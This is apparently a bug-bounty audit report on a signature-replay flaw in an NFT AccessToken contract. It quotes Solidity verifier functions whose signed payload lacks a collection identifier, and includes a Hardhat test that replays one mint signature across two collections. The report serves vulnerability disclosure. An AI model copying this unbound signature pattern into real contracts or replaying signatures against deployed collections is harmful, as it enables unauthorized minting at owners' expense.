# 57634 sc medium unauthorized minting of nfts due to signature replay

**Submitted on Oct 27th 2025 at 19:25:33 UTC by @Oxv1bh4 for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57634
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

### Brief/Intro

A valid minting signature can be replayed across different NFT collections deployed on the platform. This allows unauthorized minting of NFTs in other collections using a signature originally issued for a different one.

### Vulnerability Details

In the `AccessToken` contract, the functions `mintStaticPrice` and `mintDynamicPrice` handle the minting of new NFTs within a collection. Each minting action is authorized using a backend-generated EIP-712 signature that includes the fields: `receiver`, `tokenId`, `tokenUri`, `whitelisted`, and `block.chainid`.

Because the signature does not include any unique identifier that ties it to a specific NFT collection, the same signature can be reused to mint an NFT with the same `tokenId` and `tokenUri` in another collection. This leads to a replay scenario where a signature approved for one collection can be replayed across different collections.

The following `SignatureVerifier` library functions used to verify static and dynamic price minting signatures lack a unique collection-level identifier in the signed payload. As a result, a valid signature can be replayed across multiple NFT collections, enabling unauthorized minting without additional approval.

```solidity
function checkStaticPriceParameters(address signer, address receiver, StaticPriceParameters calldata params)
        external
        view
    {
        require(
            signer.isValidSignatureNow(
                keccak256(
                    abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.whitelisted, block.chainid)
                ),
                params.signature
            ),
            InvalidSignature()
        );
    }
function checkDynamicPriceParameters(address signer, address receiver, DynamicPriceParameters calldata params)
        external
        view
    {
        require(
            signer.isValidSignatureNow(
                keccak256(abi.encodePacked(receiver, params.tokenId, params.tokenUri, params.price, block.chainid)),
                params.signature
            ),
            InvalidSignature()
        );
    }
```

### Impact Details

A valid signature can be replayed across collections, allowing unauthorized NFT mints - CRITICAL

{% hint style="warning" %}
Unauthorized minting of NFTs is possible because signatures are not bound to a specific collection.
{% endhint %}

## References

<details>

<summary>Contract &#x26; verifier references (expand)</summary>

* AccessToken.sol::mintStaticPrice : <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol?utm\\_source=immunefi#L173-L199>
* AccessToken.sol::mintDynamicPrice : <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/tokens/AccessToken.sol?utm\\_source=immunefi#L209-L230>
* SignatureVerifier.sol::checkStaticPriceParameters : <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol#L239-L252>
* SignatureVerifier.sol::checkDynamicPriceParameters : <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/utils/SignatureVerifier.sol#L221-L232>

</details>

## Proof of Concept

Include the following test case within the `Mint` describe block in `test/v2/tokens/accessToken.test.sol`.

{% code title="test/v2/tokens/accessToken.test.ts" %}

```ts
 it.only('Unauthorized minting of NFTs', async () => {
      // Load the base fixture to set up the environment and contracts
      const {
        accessTokenEth, // AccessToken instance accepting native currency
        accessTokenERC20, // AccessToken instance accepting ERC20 tokens
        creator, // Test account acting as the NFT creator
        signer, // Backend signer used for signature authorization
        erc20Example, // Example ERC20 token used for payment
      } = await loadFixture(fixture);

      // Construct the message hash used for static price minting authorization
      // Signature includes receiver, tokenId, tokenUri, whitelisted flag, and chainId
      const message = EthCrypto.hash.keccak256([
        { type: 'address', value: creator.address },
        { type: 'uint256', value: 0 },
        { type: 'string', value: NFT_721_BASE_URI },
        { type: 'bool', value: false },
        { type: 'uint256', value: chainId },
      ]);

      // Sign the message with the backend signer’s private key
      // This signature is valid for the first collection (accessTokenEth)
      const signature = EthCrypto.sign(signer.privateKey, message);

      // Mint an NFT in the ETH-based collection using the valid signature
      await accessTokenEth.connect(creator).mintStaticPrice(
        creator.address,
        [
          {
            tokenId: 0,
            tokenUri: NFT_721_BASE_URI,
            whitelisted: false,
            signature,
          } as StaticPriceParametersStruct,
        ],
        NATIVE_CURRENCY_ADDRESS,
        ethPurchasePrice,
        {
          value: ethPurchasePrice,
        },
      );

      // Mint ERC20 tokens for the creator and approve the AccessToken contract to spend them
      await erc20Example.connect(creator).mint(creator.address, tokenPurchasePrice);
      await erc20Example.connect(creator).approve(accessTokenERC20.address, ethers.constants.MaxUint256);

      // Replay the same signature on a different collection (ERC20-based)
      // This should not be allowed but currently succeeds due to missing unique identifier in the signature
      await accessTokenERC20.connect(creator).mintStaticPrice(
        creator.address,
        [
          {
            tokenId: 0,
            tokenUri: NFT_721_BASE_URI,
            whitelisted: false,
            signature,
          } as StaticPriceParametersStruct,
        ],
        erc20Example.address,
        tokenPurchasePrice,
      );
    });
```

{% endcode %}

Run the command `npm run test`
